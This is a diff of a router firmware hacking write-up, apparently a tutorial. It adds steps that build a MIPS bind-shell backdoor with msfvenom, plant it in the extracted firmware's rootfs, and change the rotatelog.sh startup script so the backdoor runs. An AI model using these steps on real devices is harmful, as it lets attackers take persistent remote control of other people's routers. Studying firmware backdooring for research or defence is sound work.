@@ -125,7 +125,28 @@ In my case, I searched for payloads that run on mipsel architecture.
 As we can see, I can create a simple bind shell (listens in a given port and waits for a connection).
 We can create the binary itself like so:
 
-```msfvenom -p linux/mipsle/shell_bind_tcp LPORT=50505 -f elf > bs_backdoor```
+```
+msfvenom -p linux/mipsle/shell_bind_tcp LPORT=50505 -f elf > bs_backdoor
+
+cp bs_backdoor /fmk/rootfs/bin
+chmod 777 /fmk/rootfs/bin/bs_backdoor
+```
+
+But wait!
+What would make our binary run at all?
+Well, bash scripts :)
+
+In many routers, there are a some scripts that run on startup, or on some particular occasion.
+We can search for such scripts like so:
+
+```
+find fmk/rootfs -name "*.sh*"
+Output:
+fmk/rootfs/usr/sbin/rotatelog.sh
+```
+
+We can modify the script and run our shell from there!
+![image](https://user-images.githubusercontent.com/53023744/196065187-621f4102-1e10-439c-a418-1cf30a08ea7f.png)
 
 
 Also, I wanted to leave a final touch on the router's main page before we re-build the firmware, so I edited index.asp:
